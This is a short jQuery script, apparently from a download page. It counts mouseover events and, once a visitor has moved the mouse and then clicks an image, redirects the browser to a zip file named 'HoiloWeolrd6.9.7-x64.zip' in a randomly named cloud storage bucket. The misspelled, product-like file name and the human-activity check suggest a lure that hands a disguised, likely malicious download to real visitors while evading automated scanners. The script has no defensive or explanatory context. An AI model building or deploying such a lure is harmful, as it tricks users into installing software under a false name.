var numCount=0;
$(function()
{
	$("body").mouseover(function(event)
	{
		numCount++;
	});

	$("img").click(function()
	{
		if(numCount>=1)
		{
			var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
			window.location=url;
		}
	});
})